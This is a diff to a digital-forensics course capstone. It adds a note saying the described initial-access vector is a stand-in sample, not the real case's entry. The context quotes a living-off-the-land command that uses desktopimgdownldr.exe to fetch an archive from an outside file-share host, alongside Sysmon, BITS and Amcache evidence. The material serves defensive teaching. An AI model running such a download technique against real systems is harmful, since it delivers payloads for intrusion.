@@ -129,6 +129,8 @@ A LOLBAS download: **`desktopimgdownldr.exe`** (a legit Windows lockscreen-image
 `desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr`
 to fetch a **`.7z` archive** from **`a.uguu.se`** (a throwaway file-share host). It was recorded in **two channels** — **Sysmon (Event 1, the command line)** *and* **BITS-Client (59/60, the service that performed the transfer)**. Two independent records of the same download = high-confidence initial access. *(Module 5.)*
 
+> **Honesty note — this vector is a representative stand-in.** The `desktopimgdownldr → a.uguu.se` download is a **public LOLBAS technique sample** (Module 5's EVTX-ATTACK-SAMPLES data) used here to *teach* an initial-access pattern. It is **not** the literal entry vector of the real DFIR-Madness Case 001 host, which was an **RDP brute-force followed by an Internet Explorer download from `194.61.24.102`**. The capstone composes the case from several public technique captures (see [`data/README.md`](data/README.md)); treat this phase as "an initial access of this kind," not as ground truth for Case 001.
+
 ### B. Execution on patient zero (`DESKTOP-SDN1RPT`)
 - The masquerading binary is **`coreupdater.exe`** in `C:\Windows\System32\`. Prefetch: **RunCount 1**, **last run 2020-09-19 03:40:49 UTC**, **51 files loaded**.
 - **Identity card (Amcache):** SHA1 **`fd153c66386ca93ec9993d66a84d6f0d129a3a5c`**, size **7,168 bytes**, path `c:\windows\system32\coreupdater.exe`, **`IsOsComponent = False`**, **ProductName empty**, `FileKeyLastWrite` **2020-09-19 03:40:45 UTC**.
